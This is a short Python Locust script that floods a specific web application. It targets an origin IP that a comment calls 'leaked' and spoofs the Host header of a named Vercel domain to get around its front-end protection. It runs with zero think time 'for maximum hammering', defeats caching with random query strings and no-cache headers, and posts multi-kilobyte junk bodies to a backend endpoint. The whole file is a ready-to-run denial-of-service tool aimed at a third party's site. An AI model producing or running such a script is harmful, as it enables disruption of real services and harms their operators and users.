from gevent import monkey
monkey.patch_all()

import uuid
import random
from locust import HttpUser, task, between

class DirectUser(HttpUser):
    # Point directly at the origin IP you leaked
    host = "https://54.167.227.87"
    # Zero think time for maximum hammering
    wait_time = between(0, 0)

    @task(7)
    def search(self):
        # Pick a random query and cache-bust
        q = random.choice([
            "123456789012345678",
            "987654321098765432",
            "user_example",
            "ip:192.168.0.1",
        ])
        url = f"/search?q={q}&nocache={uuid.uuid4().hex}"
        self.client.get(
            url,
            name="GET /search",
            headers={
                "Host": "payment-temp-4uc3.vercel.app",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            }
        )

    @task(3)
    def heavy_api(self):
        # Simulate a heavy backend write
        payload = {"data": "x" * random.randint(1000, 10000)}
        self.client.post(
            "/api/process",
            name="POST /api/process",
            json=payload,
            headers={"Host": "payment-temp-4uc3.vercel.app"}
        )
